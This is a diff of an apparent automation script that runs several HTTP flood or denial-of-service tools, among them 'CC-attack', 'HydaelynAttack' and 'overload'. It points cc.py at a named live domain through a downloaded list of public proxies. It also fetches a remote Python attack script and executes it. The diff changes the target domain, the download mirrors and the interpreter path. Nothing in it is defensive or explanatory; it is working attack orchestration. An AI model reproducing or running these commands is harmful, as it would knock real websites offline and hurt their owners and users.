@@ -4,21 +4,21 @@ echo ""
 echo "CC-attack"
 cd CC-attack
 git pull
-curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
-python3 cc.py -url http://fwe22.top/ -f http.txt -v 5 -s 30
+curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
+F:\Python310\python.exe cc.py -url http://fwe33.top/ -f http.txt -v 5 -s 30
 cd ..
 
 echo ""
 echo "HydaelynAttack"
 cd HydaelynAttack
 git pull
-python3 HydaelynAttack_p_once_noLog.py
+F:\Python310\python.exe HydaelynAttack_p_once_noLog.py
 cd ..
 
 echo ""
 echo "overload"
 cd overload
 git pull
-curl https://nyaacaster.github.io/Nyaa-Automata/overload_p.py -o overload_p.py
-python3 overload_p.py
+curl https://jsd.cdn.zzko.cn/gh/NyaaCaster/Nyaa-Automata@main/overload_p.py -o overload_p.py
+F:\Python310\python.exe overload_p.py
 cd ..
